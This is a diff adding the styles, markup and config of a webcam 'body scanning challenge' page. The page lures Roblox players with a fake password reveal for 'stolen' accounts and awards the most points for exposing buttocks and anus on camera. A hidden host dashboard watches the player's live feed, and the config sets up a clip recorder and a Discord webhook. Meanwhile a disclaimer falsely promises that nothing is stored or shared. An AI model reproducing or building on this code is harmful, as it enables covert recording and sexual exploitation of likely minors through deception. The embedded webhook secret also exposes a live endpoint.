+            background: rgba(0, 245, 192, 0.04);
+            color: #00f5c0;
+        }
+
+        .host-slider-section {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 10px;
+            padding: 6px 10px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            flex-shrink: 0;
+        }
+        .host-slider-section .slider-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1px;
+        }
+        .host-slider-section .slider-header .label {
+            font-size: 0.5rem;
+            color: rgba(255, 255, 255, 0.1);
+            letter-spacing: 0.05em;
+        }
+        .host-slider-section .slider-header .value {
+            font-size: 0.65rem;
+            font-weight: 700;
+            color: #6bcbff;
+            font-family: 'SF Mono', monospace;
+            min-width: 28px;
+            text-align: right;
+        }
+        .host-slider-section .slider-header .value.done {
+            color: #00f5c0;
+        }
+        .host-slider-section input[type="range"] {
+            -webkit-appearance: none;
+            width: 100%;
+            height: 2.5px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            outline: none;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+        .host-slider-section input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 245, 192, 0.08);
+            transition: all 0.2s;
+        }
+        .host-slider-section input[type="range"]::-webkit-slider-thumb:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.12);
+        }
+        .host-slider-section input[type="range"]::-moz-range-thumb {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            border: none;
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 245, 192, 0.08);
+        }
+        .host-slider-section .slider-hint {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.4rem;
+            color: rgba(255, 255, 255, 0.03);
+            margin-top: 1px;
+            letter-spacing: 0.05em;
+        }
+
+        .host-player-info {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 10px;
+            padding: 6px 10px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            flex-shrink: 0;
+        }
+        .host-player-info .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5px 0;
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.15);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.015);
+        }
+        .host-player-info .info-row:last-child {
+            border-bottom: none;
+        }
+        .host-player-info .info-row .label {
+            color: rgba(255, 255, 255, 0.06);
+            font-size: 0.45rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .host-player-info .info-row .value {
+            font-weight: 600;
+            color: #e8edf5;
+            font-size: 0.6rem;
+        }
+        .host-player-info .info-row .value.timer {
+            color: #ff6b6b;
+            font-family: 'SF Mono', monospace;
+        }
+        .host-player-info .info-row .value.timer.warning {
+            color: #ffd93d;
+        }
+        .host-player-info .info-row .value.timer.danger {
+            color: #ff3d3d;
+            animation: pulse 0.6s ease-in-out infinite alternate;
+        }
+        .host-player-info .info-row .value.part {
+            color: #ffd93d;
+        }
+        .host-player-info .info-row .value.score {
+            color: #00f5c0;
+        }
+        .host-player-info .info-row .value.status-text {
+            font-size: 0.5rem;
+            color: #6bcbff;
+        }
+        .host-player-info .info-row .value.status-text.waiting {
+            color: #8899bb;
+        }
+        .host-player-info .info-row .value.status-text.approved {
+            color: #00f5c0;
+        }
+        .host-player-info .info-row .value.status-text.rejected {
+            color: #ff6b6b;
+        }
+
+        .host-actions {
+            display: flex;
+            gap: 4px;
+            justify-content: center;
+            flex-wrap: wrap;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .host-actions .btn-host-approve {
+            background: linear-gradient(135deg, #00f5c0, #00c9a0);
+            color: #0b0e14;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.6rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 50px;
+            flex: 1;
+            max-width: 80px;
+        }
+        .host-actions .btn-host-approve:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.1);
+        }
+        .host-actions .btn-host-approve:active:not(:disabled) {
+            transform: scale(0.96);
+        }
+        .host-actions .btn-host-approve:disabled {
+            opacity: 0.15;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .host-actions .btn-host-reject {
+            background: linear-gradient(135deg, #ff6b6b, #ee3b3b);
+            color: #fff;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.6rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 50px;
+            flex: 1;
+            max-width: 80px;
+        }
+        .host-actions .btn-host-reject:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.1);
+        }
+        .host-actions .btn-host-reject:active:not(:disabled) {
+            transform: scale(0.96);
+        }
+        .host-actions .btn-host-reject:disabled {
+            opacity: 0.15;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .host-actions .btn-host-approve.approved {
+            background: #00f5c0;
+            color: #0b0e14;
+            opacity: 1;
+            cursor: default;
+            box-shadow: 0 0 30px rgba(0, 245, 192, 0.08);
+        }
+        .host-actions .btn-host-reject.rejected {
+            background: #ff6b6b;
+            color: #fff;
+            opacity: 1;
+            cursor: default;
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.08);
+        }
+        .host-actions .btn-host-start {
+            background: linear-gradient(135deg, #ffd93d, #ff9100);
+            color: #0b0e14;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.6rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 70px;
+            flex: 1;
+            max-width: 100px;
+        }
+        .host-actions .btn-host-start:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 217, 61, 0.1);
+        }
+        .host-actions .btn-host-start:active:not(:disabled) {
+            transform: scale(0.96);
+        }
+        .host-actions .btn-host-start:disabled {
+            opacity: 0.15;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .host-actions .btn-host-hold {
+            background: linear-gradient(135deg, #ffa94d, #ff6b6b);
+            color: #0b0e14;
+            border: none;
+            padding: 4px 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 0.6rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            min-width: 70px;
+            flex: 1;
+            max-width: 100px;
+        }
+        .host-actions .btn-host-hold:hover:not(:disabled) {
+            transform: scale(1.04);
+            box-shadow: 0 0 30px rgba(255, 169, 77, 0.1);
+        }
+        .host-actions .btn-host-hold:active:not(:disabled) {
+            transform: scale(0.96);
+        }
+        .host-actions .btn-host-hold:disabled {
+            opacity: 0.15;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .host-actions .btn-host-hold.active {
+            background: #ffa94d;
+            color: #0b0e14;
+            opacity: 1;
+            box-shadow: 0 0 30px rgba(255, 169, 77, 0.1);
+        }
+        .host-actions .btn-boss-msg {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.15);
+            padding: 3px 10px;
+            border-radius: 40px;
+            font-size: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .host-actions .btn-boss-msg:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .host-right {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            min-height: 0;
+        }
+        .host-video-section {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            aspect-ratio: 16/11;
+            position: relative;
+            min-height: 80px;
+            flex: 1;
+        }
+        .host-video-section video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            display: none;
+        }
+        .host-video-section .video-placeholder {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #080b14;
+            color: rgba(255, 255, 255, 0.04);
+            pointer-events: none;
+        }
+        .host-video-section .video-placeholder .icon {
+            font-size: 1.8rem;
+            margin-bottom: 3px;
+            opacity: 0.2;
+        }
+        .host-video-section .video-placeholder .text {
+            font-size: 0.65rem;
+            letter-spacing: 0.05em;
+            font-weight: 300;
+            opacity: 0.3;
+        }
+        .host-video-section .video-placeholder .text .highlight {
+            color: rgba(255, 255, 255, 0.05);
+        }
+        .host-video-section .video-placeholder .sub-text {
+            font-size: 0.45rem;
+            color: rgba(255, 255, 255, 0.02);
+            margin-top: 2px;
+        }
+        .host-video-section .video-label {
+            position: absolute;
+            bottom: 4px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(6, 8, 16, 0.5);
+            backdrop-filter: blur(6px);
+            padding: 1px 10px;
+            border-radius: 40px;
+            font-size: 0.4rem;
+            color: rgba(255, 255, 255, 0.06);
+            letter-spacing: 0.05em;
+            pointer-events: none;
+            border: 1px solid rgba(255, 255, 255, 0.02);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .host-video-section .video-label .refresh-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border: none;
+            color: rgba(255, 255, 255, 0.08);
+            padding: 0px 6px;
+            border-radius: 40px;
+            font-size: 0.4rem;
+            cursor: pointer;
+            pointer-events: auto;
+            transition: all 0.2s;
+            -webkit-tap-highlight-color: transparent;
+            font-family: inherit;
+            letter-spacing: 0.05em;
+        }
+        .host-video-section .video-label .refresh-btn:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.15);
+        }
+        .host-video-section .video-label .refresh-btn:active {
+            transform: scale(0.95);
+        }
+        .host-video-section .video-label .refresh-btn.refreshing {
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        @media (max-width: 600px) {
+            .game-container {
+                padding: 10px 8px 14px;
+                border-radius: 20px;
+            }
+            .header {
+                gap: 4px;
+            }
+            .score-box,
+            .timer-box {
+                font-size: 0.65rem;
+                padding: 4px 10px;
+                min-height: 30px;
+            }
+            .score-box span,
+            .timer-box span {
+                font-size: 1rem;
+                min-width: 18px;
+            }
+            .challenge-badge {
+                font-size: 0.65rem;
+                padding: 4px 10px;
+            }
+            .status-badge {
+                font-size: 0.5rem;
+                padding: 2px 8px;
+            }
+            .btn {
+                font-size: 0.65rem;
+                padding: 6px 12px;
+                min-height: 34px;
+                max-width: 100%;
+                flex: 1 1 40%;
+            }
+            .btn-flip {
+                min-width: 34px;
+                padding: 6px 8px;
+                font-size: 0.8rem;
+                flex: 0 0 auto;
+            }
+            .cam-overlay {
+                padding: 6px 8px;
+            }
+            .points-popup {
+                font-size: 2.2rem;
+            }
+            .countdown-number {
+                font-size: 3.5rem;
+            }
+            .player-status-overlay {
+                bottom: 38px;
+                font-size: 0.5rem;
+                padding: 3px 10px;
+            }
+            #introScreen .intro-box h1 {
+                font-size: 1.6rem;
+            }
+            #hostDashboard {
+                padding: 8px 6px 10px;
+                border-radius: 16px;
+            }
+            .host-header .host-title h2 {
+                font-size: 0.8rem;
+            }
+            .host-grid {
+                gap: 4px;
+            }
+            .host-part-selector .part-item {
+                font-size: 0.45rem;
+                padding: 2px 6px;
+                min-height: 18px;
+            }
+            .host-part-selector .part-item .dot-color {
+                width: 5px;
+                height: 5px;
+            }
+            .host-part-selector .part-list {
+                max-height: 100px;
+            }
+            .host-video-section {
+                min-height: 60px;
+            }
+            .host-actions .btn-host-approve,
+            .host-actions .btn-host-reject,
+            .host-actions .btn-host-start,
+            .host-actions .btn-host-hold {
+                font-size: 0.5rem;
+                padding: 3px 10px;
+                min-width: 40px;
+            }
+            .host-actions .btn-boss-msg {
+                font-size: 0.45rem;
+                padding: 2px 6px;
+            }
+            .host-slider-section input[type="range"]::-webkit-slider-thumb {
+                width: 10px;
+                height: 10px;
+            }
+            .host-player-info .info-row {
+                font-size: 0.45rem;
+                padding: 1px 0;
+            }
+            .host-player-info .info-row .value {
+                font-size: 0.5rem;
+            }
+            #passwordReveal .password-chars {
+                font-size: 1rem;
+            }
+            #passwordReveal .char {
+                width: 20px;
+            }
+            .account-item .avatar {
+                width: 44px;
+                height: 44px;
+            }
+            .account-item .name {
+                font-size: 0.6rem;
+            }
+            #accountSelection .account-grid {
+                gap: 10px;
+            }
+            .boss-message {
+                font-size: 1.4rem;
+                padding: 10px 18px;
+            }
+        }
+        @media (max-width: 420px) {
+            .game-container {
+                padding: 6px 4px 10px;
+                border-radius: 16px;
+            }
+            .score-box,
+            .timer-box {
+                font-size: 0.55rem;
+                padding: 3px 8px;
+                min-height: 26px;
+            }
+            .score-box span,
+            .timer-box span {
+                font-size: 0.85rem;
+                min-width: 14px;
+            }
+            .challenge-badge {
+                font-size: 0.55rem;
+                padding: 3px 8px;
+            }
+            .status-badge {
+                font-size: 0.45rem;
+                padding: 2px 6px;
+            }
+            .btn {
+                font-size: 0.55rem;
+                padding: 5px 10px;
+                min-height: 30px;
+            }
+            .btn-flip {
+                min-width: 30px;
+                padding: 5px 6px;
+                font-size: 0.7rem;
+            }
+            .points-popup {
+                font-size: 1.8rem;
+            }
+            .countdown-number {
+                font-size: 3rem;
+            }
+            .player-status-overlay {
+                bottom: 32px;
+                font-size: 0.45rem;
+                padding: 2px 8px;
+            }
+            #introScreen .intro-box h1 {
+                font-size: 1.3rem;
+            }
+            #hostDashboard {
+                padding: 4px 3px 6px;
+                border-radius: 14px;
+            }
+            .host-grid {
+                gap: 3px;
+            }
+            .host-part-selector .part-item {
+                font-size: 0.4rem;
+                padding: 1px 4px;
+                min-height: 16px;
+            }
+            .host-part-selector .part-item .dot-color {
+                width: 4px;
+                height: 4px;
+            }
+            .host-part-selector .part-list {
+                max-height: 70px;
+            }
+            .host-video-section {
+                min-height: 50px;
+            }
+            .host-actions .btn-host-approve,
+            .host-actions .btn-host-reject,
+            .host-actions .btn-host-start,
+            .host-actions .btn-host-hold {
+                font-size: 0.4rem;
+                padding: 2px 8px;
+                min-width: 34px;
+            }
+            .host-actions .btn-boss-msg {
+                font-size: 0.4rem;
+                padding: 1px 5px;
+            }
+            .host-slider-section input[type="range"]::-webkit-slider-thumb {
+                width: 8px;
+                height: 8px;
+            }
+            .host-player-info .info-row {
+                font-size: 0.4rem;
+                padding: 0.5px 0;
+            }
+            .host-player-info .info-row .value {
+                font-size: 0.45rem;
+            }
+            #passwordReveal .password-chars {
+                font-size: 0.85rem;
+            }
+            #passwordReveal .char {
+                width: 16px;
+            }
+            .account-item .avatar {
+                width: 38px;
+                height: 38px;
+            }
+            .account-item .name {
+                font-size: 0.5rem;
+            }
+            #accountSelection .account-grid {
+                gap: 6px;
+            }
+            .boss-message {
+                font-size: 1.2rem;
+                padding: 8px 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="game-container">
+        <!-- ─── HEADER ─── -->
+        <div class="header">
+            <div class="score-box">🏆 Score <span id="scoreDisplay">0</span></div>
+            <div class="timer-box" id="timerBox">⏱️ <span id="timerDisplay">30</span>s</div>
+        </div>
+
+        <!-- ─── CAMERA WRAPPER ─── -->
+        <div class="cam-wrapper" id="camWrapper">
+            <video id="webcam" autoplay playsinline muted></video>
+            <video id="recorderVideo" autoplay playsinline muted></video>
+
+            <!-- Password Reveal (center) -->
+            <div id="passwordReveal">
+                <div class="title">🔐 Revealing Password</div>
+                <div class="password-chars" id="passwordChars"></div>
+            </div>
+
+            <!-- Boss Message (player sees) -->
+            <div class="boss-message" id="bossMessage">✋ Hold Still</div>
+
+            <div class="points-popup" id="pointsPopup"></div>
+            <div class="countdown-number" id="countdownNumber"></div>
+            <div class="hold-still-msg" id="holdStillMsg">✋ hold still</div>
+
+            <div class="cam-overlay">
+                <div class="challenge-badge" id="challengeBadge">
+                    <span class="emoji">🎯</span>
+                    Show <span class="highlight" id="challengeTarget">—</span>
+                </div>
+                <div class="status-badge waiting" id="statusBadge">⏳ waiting…</div>
+            </div>
+
+            <div class="player-status-overlay" id="playerStatusOverlay">⏳ waiting for AI to start…</div>
+
+            <!-- ─── OVERLAY: Intro Chillz ─── -->
+            <div class="overlay-screen show" id="introChillz">
+                <div class="chillz-profile"><img src="chillz.png" alt="Chillz" /></div>
+                <h1>subscribe to Chillz</h1>
+                <div class="sub">on YouTube</div>
+            </div>
+
+            <!-- ─── OVERLAY: Account Selection ─── -->
+            <div class="overlay-screen" id="accountSelection">
+                <h2 style="font-size:clamp(1.4rem, 4vw, 2rem); color:#ff6b6b; font-weight:700; letter-spacing:0.02em;">stolen or lost<br />Roblox accounts</h2>
+                <div class="account-grid" id="accountGrid"></div>
+                <div style="margin-top:10px; font-size:0.6rem; color:rgba(255,255,255,0.05); letter-spacing:0.05em;">select an account to reveal password</div>
+            </div>
+
+            <!-- ─── OVERLAY: Safety Messages ─── -->
+            <div class="overlay-screen" id="safetyOverlay">
+                <div class="safety-text" id="safetyText">keep your identity safe</div>
+            </div>
+
+            <!-- ─── INTRO SCREEN (voice only) ─── -->
+            <div id="introScreen">
+                <div class="intro-box">
+                    <h1>🚫 Faceless</h1>
+                    <div class="sub">AI-powered body scanning challenge</div>
+                    <div class="voice-prompt">
+                        🎤 say <span class="highlight-begin">"begin"</span> to play
+                    </div>
+                    <div class="voice-status" id="voiceStatus">🎤 listening …</div>
+                    <div class="host-badge" id="hostBadge">👑 HOST MODE ACTIVE</div>
+                </div>
+            </div>
+
+            <!-- ─── PLAYER DISCLAIMER ─── -->
+            <div id="playerDisclaimer">
+                <div class="disclaimer-box">
+                    <h2>📋 Before you start</h2>
+                    <p>This is an <strong>AI-powered simulation</strong> for entertainment purposes only.<br /><br />
+                        No personal data, video, or audio is stored or shared. Everything stays local and is processed in real-time.<br /><br />
+                        By continuing, you agree to participate in this virtual challenge.</p>
+                    <div class="countdown-area">
+                        <span class="countdown-number-display" id="countdownTimerDisplay">5</span>
+                        <span class="countdown-label">seconds until start…</span>
+                    </div>
+                    <button class="btn-continue" id="disclaimerContinueBtn">Continue →</button>
+                </div>
+            </div>
+
+            <!-- ─── HOST DASHBOARD ─── -->
+            <div id="hostDashboard">
+                <div class="host-header">
+                    <div class="host-title">
+                        <span class="crown">👑</span>
+                        <h2>Host Dashboard</h2>
+                    </div>
+                    <div class="host-status">
+                        <span class="dot offline" id="hostDot"></span>
+                        <span id="hostStatusLabel">offline</span>
+                    </div>
+                </div>
+                <div class="host-grid">
+                    <div class="host-left">
+                        <!-- Body Part Selector -->
+                        <div class="host-part-selector" id="hostPartSelector">
+                            <div class="selector-header">
+                                <span class="title">🎯 Body Parts</span>
+                                <span class="current-part-label" id="currentPartLabel">—</span>
+                            </div>
+                            <div class="part-list" id="partList"></div>
+                        </div>
+
+                        <!-- Progress Slider -->
+                        <div class="host-slider-section">
+                            <div class="slider-header">
+                                <span class="label">📊 Progress</span>
+                                <span class="value" id="sliderValue">0%</span>
+                            </div>
+                            <input type="range" id="progressSlider" min="0" max="100" value="0" step="1" />
+                            <div class="slider-hint">
+                                <span>0%</span>
+                                <span>drag to control AI scan</span>
+                                <span>100%</span>
+                            </div>
+                        </div>
+
+                        <!-- Player Info -->
+                        <div class="host-player-info">
+                            <div class="info-row">
+                                <span class="label">Player</span>
+                                <span class="value status-text waiting" id="hostPlayerStatus">⏳ waiting for connection…</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="label">Current Part</span>
+                                <span class="value part" id="hostPartName">—</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="label">Timer</span>
+                                <span class="value timer" id="hostTimerDisplay">30s</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="label">Score</span>
+                                <span class="value score" id="hostScoreDisplay">0</span>
+                            </div>
+                            <div class="info-row">
+                                <span class="label">Status</span>
+                                <span class="value status-text" id="hostScanStatus">⏳ scanning…</span>
+                            </div>
+                        </div>
+
+                        <!-- Actions -->
+                        <div class="host-actions">
+                            <button class="btn-host-start" id="hostStartBtn">▶ Start Game</button>
+                            <button class="btn-host-hold" id="hostHoldBtn">✋ Hold Still</button>
+                            <button class="btn-host-approve" id="hostApproveBtn">✅ Approve</button>
+                            <button class="btn-host-reject" id="hostRejectBtn">❌ Reject</button>
+                            <button class="btn-boss-msg" data-msg="Back up">⬅️ Back up</button>
+                            <button class="btn-boss-msg" data-msg="Zoom in closer">🔍 Zoom in</button>
+                        </div>
+                    </div>
+
+                    <div class="host-right">
+                        <div class="host-video-section">
+                            <video id="hostVideo" autoplay playsinline muted></video>
+                            <div class="video-placeholder" id="videoPlaceholder">
+                                <div class="icon">📹</div>
+                                <div class="text">waiting for <span class="highlight">player's camera</span></div>
+                                <div class="sub-text">player will connect after account selection</div>
+                            </div>
+                            <div class="video-label">
+                                📹 player's camera
+                                <button class="refresh-btn" id="refreshCamBtn">⟳ refresh</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ─── GAME OVER (unused) ─── -->
+            <div class="gameover-overlay" id="gameoverOverlay" style="display:none;"></div>
+        </div>
+
+        <!-- ─── CONTROLS ─── -->
+        <div class="controls">
+            <button class="btn btn-primary" id="startBtn" disabled>
+                <span id="startBtnText">🚀 Start</span>
+                <span id="startSpinner" class="hidden"><span class="spinner"></span></span>
+            </button>
+            <button class="btn btn-outline" id="resetBtn" disabled>⟲ Reset</button>
+            <button class="btn btn-flip" id="flipBtn" disabled>⟳</button>
+        </div>
+
+        <div class="loading-container" id="loadingContainer">
+            <div class="loading-track">
+                <div class="loading-fill" id="loadingFill" style="width:0%;"></div>
+            </div>
+            <div class="loading-label">
+                <span>loading AI model</span>
+                <span class="pct" id="loadingPct">0%</span>
+            </div>
+        </div>
+
+        <div class="status-msg" id="statusMsg">Loading AI model… please wait.</div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  CONFIG
+        // ============================================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
+        const CLIP_DURATION = 10;
+        const SCAN_TIME = 30;
+        const BOSS_ROOM_ID = 'bossroom';
+
+        // ─── BODY PARTS ──────────────────────────────────────────────────────────
+        const BODY_PARTS = [
+            { id: 'left_pinky', label: 'Left Pinky', points: 1, emoji: '🖐️', color: 'green' },
+            { id: 'right_pinky', label: 'Right Pinky', points: 1, emoji: '🖐️', color: 'green' },
+            { id: 'left_thumb', label: 'Left Thumb', points: 1, emoji: '👍', color: 'green' },
+            { id: 'right_thumb', label: 'Right Thumb', points: 1, emoji: '👍', color: 'green' },
+            { id: 'left_index', label: 'Left Index', points: 1, emoji: '☝️', color: 'green' },
+            { id: 'right_index', label: 'Right Index', points: 1, emoji: '☝️', color: 'green' },
+            { id: 'left_middle', label: 'Left Middle', points: 1, emoji: '🖕', color: 'green' },
+            { id: 'right_middle', label: 'Right Middle', points: 1, emoji: '🖕', color: 'green' },
+            { id: 'left_ring', label: 'Left Ring', points: 1, emoji: '💍', color: 'green' },
+            { id: 'right_ring', label: 'Right Ring', points: 1, emoji: '💍', color: 'green' },
+            { id: 'left_forearm', label: 'Left Forearm', points: 2, emoji: '💪', color: 'green' },
+            { id: 'right_forearm', label: 'Right Forearm', points: 2, emoji: '💪', color: 'green' },
+            { id: 'left_hand', label: 'Left Hand', points: 2, emoji: '✋', color: 'green' },
+            { id: 'right_hand', label: 'Right Hand', points: 2, emoji: '🤚', color: 'green' },
+            { id: 'left_shoulder', label: 'Left Shoulder', points: 3, emoji: '🦴', color: 'green' },
+            { id: 'right_shoulder', label: 'Right Shoulder', points: 3, emoji: '🦴', color: 'green' },
+            { id: 'left_elbow', label: 'Left Elbow', points: 3, emoji: '💪', color: 'green' },
+            { id: 'right_elbow', label: 'Right Elbow', points: 3, emoji: '💪', color: 'green' },
+            { id: 'left_knee', label: 'Left Knee', points: 4, emoji: '🦵', color: 'yellow' },
+            { id: 'right_knee', label: 'Right Knee', points: 4, emoji: '🦵', color: 'yellow' },
+            { id: 'left_leg', label: 'Left Leg', points: 4, emoji: '🦵', color: 'yellow' },
+            { id: 'right_leg', label: 'Right Leg', points: 4, emoji: '🦵', color: 'yellow' },
+            { id: 'left_foot', label: 'Left Foot', points: 6, emoji: '🦶', color: 'yellow' },
+            { id: 'right_foot', label: 'Right Foot', points: 6, emoji: '🦶', color: 'yellow' },
+            { id: 'left_under_foot', label: 'Left Under Foot', points: 7, emoji: '🦶', color: 'orange' },
+            { id: 'right_under_foot', label: 'Right Under Foot', points: 7, emoji: '🦶', color: 'orange' },
+            { id: 'ribs', label: 'Ribs', points: 8, emoji: '🦴', color: 'orange' },
+            { id: 'chest', label: 'Chest', points: 8, emoji: '🫀', color: 'orange' },
+            { id: 'back', label: 'Back', points: 8, emoji: '🦴', color: 'orange' },
+            { id: 'armpits', label: 'Armpits', points: 9, emoji: '🦵', color: 'orange' },
+            { id: 'belly_button', label: 'Belly Button', points: 12, emoji: '🫃', color: 'red' },
+            { id: 'butt_crack', label: 'Butt Crack', points: 100, emoji: '🍑', color: 'red' },
+            { id: 'bootyhole', label: 'Bootyhole', points: 500, emoji: '🍑', color: 'red' },
+        ];
+
+        // ─── PASSWORD ──────────────────────────────────────────────────────────
+        const PASSWORD = 'yuleisi11chillzONyoutube'.split('');
+
+        // ─── ACCOUNTS ──────────────────────────────────────────────────────────
+        const ACCOUNTS = [
+            { name: 'Account1', img: 'account1.png', locked: true },
+            { name: 'Account2', img: 'account2.png', locked: true },
+            { name: 'RDM_GAMEINGS2', img: 'account3.png', locked: false },
+            { name: 'Account4', img: 'account4.png', locked: true },
+            { name: 'Account5', img: 'account5.png', locked: true },
+            { name: 'Account6', img: 'account1.png', locked: true },
+        ];
+        // Track which account is "online" (green dot) - only RDM_GAMEINGS2 for now
+        const ONLINE_ACCOUNT = 'RDM_GAMEINGS2';
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let state = {
+            modelLoaded: false,
+            gameStarted: false,
+            isScanning: false,
+            currentPartIndex: 0,
+            totalPoints: 0,
+            partResults: [],
+            scanTimer: SCAN_TIME,
+            partDetected: false,
+            facingMode: 'user',
+            stream: null,
+            recorderStream: null,
+            mediaRecorder: null,
+            recordedChunks: [],
+            recorderActive: false,
+            recordingStarted: false,
+            scanInterval: null,
+            countdownInterval: null,
+            progressValue: 0,
+            holdStillActive: false,
+            holdStillTimer: 0,
+            elapsedTime: 0,
+            countdownIntervalRec: null,
+            isHost: false,
+            isPlayer: false,
+            playerConnected: false,
+            currentPartApproved: false,
+            currentPartRejected: false,
+            waitingForApproval: false,
+            hostMode: false,
+            hostTimer: SCAN_TIME,
+            hostPartName: '—',
+            hostPlayerStatus: '⏳ waiting for connection…',
+            hostScanStatus: '⏳ waiting…',
+            hostScore: 0,
+            hostSliderValue: 0,
+            hostGameStarted: false,
+            playerWaitingForStart: false,
+            holdStillRequested: false,
+            peer: null,
+            peerConnection: null,
+            dataConnection: null,
+            remoteStream: null,
+            countdownRunning: false,
+            revealedIndices: [],
+            lostIndices: [],
+            bossMsgTimeout: null,
+            recorderStarted: false,
+            accountSelected: false,
+        };
+
+        // ============================================================
+        //  DOM REFS
+        // ============================================================
+        const video = document.getElementById('webcam');
+        const recorderVideo = document.getElementById('recorderVideo');
+        const hostVideo = document.getElementById('hostVideo');
+        const scoreDisplay = document.getElementById('scoreDisplay');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const timerBox = document.getElementById('timerBox');
+        const challengeTarget = document.getElementById('challengeTarget');
+        const challengeBadge = document.getElementById('challengeBadge');
+        const statusBadge = document.getElementById('statusBadge');
+        const statusMsg = document.getElementById('statusMsg');
+        const startBtn = document.getElementById('startBtn');
+        const startBtnText = document.getElementById('startBtnText');
+        const startSpinner = document.getElementById('startSpinner');
+        const resetBtn = document.getElementById('resetBtn');
+        const flipBtn = document.getElementById('flipBtn');
+        const pointsPopup = document.getElementById('pointsPopup');
+        const countdownNumber = document.getElementById('countdownNumber');
+        const loadingFill = document.getElementById('loadingFill');
+        const loadingPct = document.getElementById('loadingPct');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const holdStillMsg = document.getElementById('holdStillMsg');
+
+        const introScreen = document.getElementById('introScreen');
+        const voiceStatus = document.getElementById('voiceStatus');
+        const hostBadge = document.getElementById('hostBadge');
+
+        const hostDashboard = document.getElementById('hostDashboard');
+        const hostPlayerStatus = document.getElementById('hostPlayerStatus');
+        const hostPartName = document.getElementById('hostPartName');
+        const hostTimerDisplay = document.getElementById('hostTimerDisplay');
+        const hostScoreDisplay = document.getElementById('hostScoreDisplay');
+        const hostScanStatus = document.getElementById('hostScanStatus');
+        const hostApproveBtn = document.getElementById('hostApproveBtn');
+        const hostRejectBtn = document.getElementById('hostRejectBtn');
+        const hostStartBtn = document.getElementById('hostStartBtn');
+        const hostHoldBtn = document.getElementById('hostHoldBtn');
+        const hostDot = document.getElementById('hostDot');
+        const hostStatusLabel = document.getElementById('hostStatusLabel');
+        const videoPlaceholder = document.getElementById('videoPlaceholder');
+        const partList = document.getElementById('partList');
+        const currentPartLabel = document.getElementById('currentPartLabel');
+        const progressSlider = document.getElementById('progressSlider');
+        const sliderValue = document.getElementById('sliderValue');
+        const refreshCamBtn = document.getElementById('refreshCamBtn');
